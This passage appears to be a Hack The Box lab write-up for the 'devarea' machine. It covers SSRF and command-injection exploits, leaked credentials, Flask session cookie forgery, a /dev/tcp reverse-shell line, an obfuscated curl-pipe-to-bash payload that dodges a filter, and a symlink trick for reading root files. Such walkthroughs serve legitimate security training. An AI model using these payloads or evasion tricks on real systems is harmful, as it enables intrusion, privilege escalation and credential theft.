██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ██║  ██║██╔════╝ ╚════██╗██╔════╝ ██║  ██║                                                     
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝     ███████║███████╗  █████╔╝███████╗ ███████║                                                     
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗     ╚════██║██╔═══██╗██╔═══╝ ██╔═══██╗╚════██║                                                     
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝          ██║╚██████╔╝███████╗╚██████╔╝     ██║                                                     
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝           ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝                                                     
                                                                                 

======================================================================           
  CVE-2022-46364 | Apache CXF SSRF via MTOM XOP:Include                          
  CVSS 9.8 CRITICAL | CWE-918                                                    
======================================================================           
                                                                                 
[CONFIG]
  Target:   http://devarea.htb:8080/employeeservice
  SSRF URL: file:///etc/systemd/system/hoverfly.service
  Domain:   devarea.htb
  Method:   MTOM

[*] Sending exploit payload...
[+] Server responded: HTTP 200

[RAW RESPONSE SNIPPET]
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUK                                                                   

[BASE64 EXTRACTED]
W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZs...                                        

[EXFILTRATED CONTENT]
======================================================================
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target

======================================================================

[✓] EXPLOIT SUCCESSFUL
Server fetched internal resource and returned contents.
                                                                                 
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/devarea]
└─$ 
```
Logged in as `admin`, saw `v1.11.3` confirming that [CVE-2025-54123](https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf) works:
```bash
──(jameskaois㉿kali)-[~/Documents/hackthebox/devarea]
└─$ python3 CVE-2025-54123.py -t http://devarea.htb:8888 -u admin -p O7IJ27MyyXiU -c whoami 

 ██╗  ██╗ ██████╗ ██╗   ██╗███████╗██████╗ ███████╗██╗  ██╗   ██╗    ██████╗  ██████╗███████╗                                                                     
 ██║  ██║██╔═══██╗██║   ██║██╔════╝██╔══██╗██╔════╝██║  ╚██╗ ██╔╝    ██╔══██╗██╔════╝██╔════╝                                                                     
 ███████║██║   ██║██║   ██║█████╗  ██████╔╝█████╗  ██║   ╚████╔╝     ██████╔╝██║     █████╗                                                                       
 ██╔══██║██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██╔══╝  ██║    ╚██╔╝      ██╔══██╗██║     ██╔══╝                                                                       
 ██║  ██║╚██████╔╝ ╚████╔╝ ███████╗██║  ██║██║     ███████╗██║       ██║  ██║╚██████╗███████╗                                                                     
 ╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝       ╚═╝  ╚═╝ ╚═════╝╚══════╝                                                                     
                CVE-2025-54123 | Authenticated Middleware Command Injection      
                                                                                 

======================================================================           
  CVE-2025-54123 | Hoverfly Authenticated Middleware RCE                         
  CVSS 9.8 CRITICAL | CWE-78 (Command Injection)                                 
======================================================================           
                                                                                 
[CONFIG]
  Target:   http://devarea.htb:8888
  Username: admin
  Password: ************
  Shell:    /bin/bash
  Command:  whoami

[*] Authenticating to http://devarea.htb:8888...
[+] Authentication successful
    Token: eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwO...

[PAYLOAD]
{
  "binary": "/bin/bash",                                                         
  "script": "whoami"                                                             
}                                                                                

[*] Sending exploit to http://devarea.htb:8888/api/v2/hoverfly/middleware...
[+] Server responded: HTTP 422

[RAW RESPONSE SNIPPET]
{"error":"Failed to unmarshal JSON from middleware\nCommand: /bin/bash /tmp/hoverfly/hoverfly_2802060031\ninvalid character 'd' looking for beginning of value\n\nSTDIN:\n{\"response\":{\"status\":200,\"body\":\"ok\",\"encodedBody\":false,\"headers\":{\"test_header\":[\"true\"]}},\"request\":{\"path\":\"/\",\"method\":\"GET\",\"destination\":\"www.test.com\",\"scheme\":\"\",\"query\":\"\",\"formData\":null,\"body\":\"\",\"headers\":{\"test_header\":[\"true\"]}}}\n\nSTDOUT:\ndev_ryan\n"}                                                                             

[COMMAND OUTPUT]
======================================================================
dev_ryan
======================================================================

[✓] EXPLOIT SUCCESSFUL
Command executed on target system.
```
## Get user flag
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nc -lvnp 4444                  
listening on [any] 4444 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.244.208] 41626
bash: cannot set terminal process group (1423): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root     root     4096 Dec  4  2025 .
drwxr-xr-x 24 root     root     4096 Mar 22 18:55 ..
drwxr-x---  5 dev_ryan dev_ryan 4096 Mar 10 16:28 dev_ryan
dev_ryan@devarea:/opt/HoverFly$ ls -la /home/dev_ryan
ls -la /home/dev_ryan
total 56
drwxr-x--- 5 dev_ryan dev_ryan  4096 Mar 10 16:28 .
drwxr-xr-x 3 root     root      4096 Dec  4  2025 ..
lrwxrwxrwx 1 root     root         9 Mar 10 16:28 .bash_history -> /dev/null
-rw-r--r-- 1 dev_ryan dev_ryan   220 Sep 21  2025 .bash_logout
-rw-r--r-- 1 dev_ryan dev_ryan  3771 Sep 21  2025 .bashrc
drwx------ 2 dev_ryan dev_ryan  4096 Sep 21  2025 .cache
drwxrwxr-x 3 dev_ryan dev_ryan  4096 Dec 12  2025 .local
-rw-r--r-- 1 dev_ryan dev_ryan   807 Sep 21  2025 .profile
drwx------ 2 dev_ryan dev_ryan  4096 Mar 11 12:59 .ssh
-rw-r--r-- 1 root     root     20260 Dec 14  2025 syswatch-v1.zip
-rw-r----- 1 root     dev_ryan    33 Jun 27 12:55 user.txt
dev_ryan@devarea:/opt/HoverFly$ cat /home/dev_ryan/user.txt
cat /home/dev_ryan/user.txt
750a2d6c72e6cb514bc10922bfb21859
```
## Lateral Movement
```bash
dev_ryan@devarea:~$ cat /etc/syswatch.env
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
SYSWATCH_LOG_DIR=/opt/syswatch/logs
SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
SYSWATCH_VERSION=1.0.0
```
Create JWT to login to SysWatch in `127.0.0.1:7777`:
```python
# jwt_forgery.py
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
SECRET = "f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725"
def generate_flask_session(data):
serializer = URLSafeTimedSerializer(
SECRET,
salt='cookie-session',
serializer=TaggedJSONSerializer(),
signer_kwargs={
'key_derivation': 'hmac',
'digest_method': hashlib.sha1
}
)
return serializer.dumps(data)
cookie = generate_flask_session({
"user_id": 1,
"username": "admin"
})
print(cookie)
```
```bash
dev_ryan@devarea:~$ ss -tulnp
Netid    State     Recv-Q    Send-Q         Local Address:Port         Peer Address:Port    Process                                
udp      UNCONN    0         0                 127.0.0.54:53                0.0.0.0:*                                              
udp      UNCONN    0         0              127.0.0.53%lo:53                0.0.0.0:*                                              
udp      UNCONN    0         0                    0.0.0.0:68                0.0.0.0:*                                              
tcp      LISTEN    0         100                127.0.0.1:25                0.0.0.0:*                                              
tcp      LISTEN    0         511                  0.0.0.0:80                0.0.0.0:*                                              
tcp      LISTEN    0         4096           127.0.0.53%lo:53                0.0.0.0:*                                              
tcp      LISTEN    0         4096                 0.0.0.0:22                0.0.0.0:*                                              
tcp      LISTEN    0         4096              127.0.0.54:53                0.0.0.0:*                                              
tcp      LISTEN    0         128                127.0.0.1:7777              0.0.0.0:*                                              
tcp      LISTEN    0         4096                       *:8888                    *:*        users:(("hoverfly",pid=1462,fd=6))    
tcp      LISTEN    0         4096                       *:8500                    *:*        users:(("hoverfly",pid=1462,fd=5))    
tcp      LISTEN    0         4096                    [::]:22                   [::]:*                                              
tcp      LISTEN    0         32                         *:21                      *:*                                              
tcp      LISTEN    0         50                         *:8080                    *:*        users:(("java",pid=1461,fd=26))       
tcp      LISTEN    0         100                    [::1]:25                   [::]:*                                              
dev_ryan@devarea:~$ exit
logout
Connection to devarea.htb closed.
                                                                                                                                   
┌──(jameskaois㉿kali)-[~]
└─$ ssh -L 7777:localhost:7777 dev_ryan@devarea.htb -i ~/.ssh/id_rsa
```
Since Syswatch UI block special letters, so use Burp Suite or custom fetch:
```javascript
await fetch("http://127.0.0.1:7777/service-status", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    },
    "referrer": "http://127.0.0.1:7777/service-status",
    "body": "service=ssh|id",
    "method": "POST",
    "mode": "cors"
});
```
Got:
```
uid=984(syswatch) gid=984(syswatch) groups=984(syswatch)
```
Use `service=ssh|bash -i >& /dev/tcp/10.10.15.11/4444 0>&1` but it got blocked, so I have to use obfuscated version:
```json
"body": "service=ssh|curl http:$(eval \"echo \\$$\(echo path | awk '{print toupper($0)}')\" | awk '{print substr($0,1,1)}')$(eval \"echo \\$$\(echo path | awk '{print toupper($0)}')\" | awk '{print substr($0,1,1)}')10$(ls | head -n 1 | awk '{print substr($0,4,1)}')10$(ls | head -n 1 | awk '{print substr($0,4,1)}')15$(ls | head -n 1 | awk '{print substr($0,4,1)}')11:80$(eval \"echo \\$$\(echo path | awk '{print toupper($0)}')\" | awk '{print substr($0,1,1)}')shell | bash",
```
```bash
syswatch@devarea:~/syswatch_gui$ id
uid=984(syswatch) gid=984(syswatch) groups=984(syswatch)
syswatch@devarea:~/syswatch_gui$ 
```
## Get root flag
Prepare files:
```bash
syswatch@devarea:~/logs$ ln -s /root/root.txt test.log
syswatch@devarea:~/logs$ ln -sf test.log disk.log
syswatch@devarea:~/logs$ ls -la disk.log
lrwxrwxrwx 1 syswatch syswatch 8 Jul  5 13:27 disk.log -> test.log
syswatch@devarea:~/logs$ 
```
Got flag:
```bash
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs disk.log
082129979128b2f458d962c35212983b
dev_ryan@devarea:~$ 
```